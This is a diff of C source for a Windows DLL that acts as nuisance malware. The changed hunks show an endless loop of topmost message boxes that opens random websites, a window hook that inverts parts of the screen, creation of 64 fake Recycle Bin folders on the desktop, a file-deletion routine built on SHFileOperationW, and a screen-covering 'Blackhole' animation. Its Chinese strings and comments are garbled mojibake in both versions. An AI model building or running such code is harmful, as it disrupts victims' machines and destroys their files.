@@ -25,16 +25,16 @@ const int website_len = 5;
 
 
 LPCWSTR WebsiteNames[5] = {
-	L"¶È", 
+	L"åº¦", 
 	L"2233",
-	L"¹¾¸ë", 
-	L"±ØÓ¦",
+	L"å’•é¸½", 
+	L"å¿…åº”",
 	L"360"
 };
 
 
 int scrw, scrh;
-LPCWSTR okayButton = L"ÎÒÏ«ÁË";
+LPCWSTR okayButton = L"æˆ‘æ±äº†";
 LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode < 0)
 		return CallNextHookEx(0, nCode, wParam, lParam);
@@ -50,8 +50,6 @@ LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
 	}
 	
 	if (msg->message == WM_PAINT) {
-		
-		
 		HDC hdc = GetWindowDC(msg->hwnd);
 		int x1 = random()%w, y1 = random()%h;
 		BitBlt(hdc, x1, y1, x1+random()%(w-x1), y1+random()%(h-y1), hdc, x1, y1, NOTSRCCOPY);
@@ -81,23 +79,23 @@ int WINAPI Question(){
 	for(;;){
 		MessageBeep(MB_ICONINFORMATION); 
 		HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
-		int opt = MessageBoxW(NULL, L"Ğ¡ÅèÓÑ£¬ÄãÊÇ·ñÓĞºÜ¶àÎÊºÅ£¿", L"£¿£¿£¿", MB_ICONQUESTION|MB_YESNO|MB_TOPMOST);
+		int opt = MessageBoxW(NULL, L"å°ç›†å‹ï¼Œä½ æ˜¯å¦æœ‰å¾ˆå¤šé—®å·ï¼Ÿ", L"ï¼Ÿï¼Ÿï¼Ÿ", MB_ICONQUESTION|MB_YESNO|MB_TOPMOST);
 		UnhookWindowsHookEx(hook);
 		if(opt == IDYES) {
 			int idx = random()%website_len;
 			ShellExecuteA(NULL, "open", lpWebsites[idx], "", "", SW_SHOWNORMAL);
 			LPWSTR lpMsgBoxText = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
 			
-			wsprintfW(lpMsgBoxText, L"ÄÇ¾ÍÈ¥ÎÊÎÊ%sÄï°É£¡£¡£¡", WebsiteNames[idx]);
-			okayButton = L"ºÃµÄÎÒÏ«ÁË";
+			wsprintfW(lpMsgBoxText, L"é‚£å°±å»é—®é—®%så¨˜å§ï¼ï¼ï¼", WebsiteNames[idx]);
+			okayButton = L"å¥½çš„æˆ‘æ±äº†";
 			HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
 			MessageBoxW(NULL, lpMsgBoxText, L"!!!", MB_ICONWARNING|MB_OK|MB_TOPMOST);
 			UnhookWindowsHookEx(hook);
 		}
 		else{
-			okayButton = L"ÔÙÀ´ÒÚ±é";
+			okayButton = L"å†æ¥äº¿é";
 			HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
-			MessageBoxW(NULL, L"ÕâÑù¿É²»áÜØ¡£¬ÓĞÎÊÌâÒ»¶¨Òª²»³ÜÏÂÎÊÅ¶£¡", L"¡£¡£¡£", MB_ICONERROR|MB_OK|MB_TOPMOST);
+			MessageBoxW(NULL, L"è¿™æ ·å¯ä¸å½³äºï¼Œæœ‰é—®é¢˜ä¸€å®šè¦ä¸è€»ä¸‹é—®å“¦ï¼", L"ã€‚ã€‚ã€‚", MB_ICONERROR|MB_OK|MB_TOPMOST);
 			UnhookWindowsHookEx(hook);
 		}
 	}
@@ -111,7 +109,7 @@ int RecycleBin(){
 	lstrcatW(lpPath, L"\\Desktop");
 	int i;
 	for(i = 0; i < 64; i++){
-		swprintf(lpNewPath, L"%s\\»ØÊÕÕ¾%d.{645FF040-5081-101B-9F08-00AA002F954E}", lpPath, i+1);
+		swprintf(lpNewPath, L"%s\\å›æ”¶ç«™%d.{645FF040-5081-101B-9F08-00AA002F954E}", lpPath, i+1);
 		CreateDirectoryW(lpNewPath, NULL);
 		if(i%8==7) SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, NULL, NULL); 
 		Sleep(100); 
@@ -193,10 +191,10 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 DWORD WINAPI DeleteFilep(LPVOID lpszPath){
 
 	SHFILEOPSTRUCTW FileOp={0};
-	FileOp.fFlags = FOF_WANTNUKEWARNING|FOF_ALLOWUNDO; //²»³öÏÖÈ·ÈÏ¶Ô»°¿ò
+	FileOp.fFlags = FOF_WANTNUKEWARNING|FOF_ALLOWUNDO; //ä¸å‡ºç°ç¡®è®¤å¯¹è¯æ¡†
 	FileOp.pFrom = (LPCWSTR)lpszPath;
-	FileOp.pTo = NULL;      //Ò»¶¨ÒªÊÇNULL
-	FileOp.wFunc = FO_DELETE;    //É¾³ı²Ù×÷
+	FileOp.pTo = NULL;      //ä¸€å®šè¦æ˜¯NULL
+	FileOp.wFunc = FO_DELETE;    //åˆ é™¤æ“ä½œ
 	FileOp.lpszProgressTitle = lpszPath;
 	SHFileOperationW(&FileOp);
 	return GetLastError();
@@ -224,19 +222,18 @@ int WINAPI DeleteFiles(){
 
 
 COLORREF colors[7] = {
-	RGB(255, 0, 0), //ºì 
-	RGB(255, 165, 0), //³È 
-	RGB(255, 255, 0), //»Æ 
-	RGB(0, 255, 0), //ÂÌ 
-	RGB(0, 0, 255), //À¶ 
-	RGB(128, 0, 211), //µå 
-	RGB(192, 0, 255) //×Ï 
+	RGB(255, 0, 0), //çº¢ 
+	RGB(255, 128, 0), //æ©™ 
+	RGB(255, 255, 0), //é»„ 
+	RGB(0, 255, 0), //ç»¿
+	RGB(128, 0, 255), //é› 
+        RGB(0, 0, 255), //è“ 
+	RGB(192, 0, 255) //ç´« 
 
 };
 int MAXDEPTH = 5;      /* Bigger depth takes longer to draw */
 
-void
-Hilbert(HDC hdc, int x, int y, int vx, int vy, int wx, int wy, int n)
+void Hilbert(HDC hdc, int x, int y, int vx, int vy, int wx, int wy, int n)
 {
     if (n >= MAXDEPTH) {
     	HPEN hPen = CreatePen(0, 1, colors[x*y%7]);
@@ -286,7 +283,7 @@ int Blackhole(){
 	int i;
 	for(i = 0; i <= cx; i++){
 		Ellipse(hdc, cx - i*ckb, cy - i, cx + i*ckb, cy + i);
-		Sleep(5);
+		Sleep(1);
 	}
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
